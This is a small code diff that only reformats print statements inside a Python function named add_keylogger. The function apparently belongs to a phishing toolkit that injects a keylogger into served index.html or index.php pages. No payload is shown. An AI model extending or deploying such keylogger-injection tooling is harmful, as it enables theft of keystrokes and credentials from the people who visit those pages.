@@ -21,7 +21,8 @@ def add_keylogger():
         f = open('Server/www/index.html', 'w')
         f.write(c)
         f.close()
-        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
+        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(
+            default_palette[0], default_palette[4]))
         wait(2)
     else:
         with open('Server/www/index.php') as f:
@@ -31,6 +32,6 @@ def add_keylogger():
         f = open('Server/www/index.php', 'w')
         f.write(c)
         f.close()
-        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
+        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(
+            default_palette[0], default_palette[4]))
         wait(2)
-
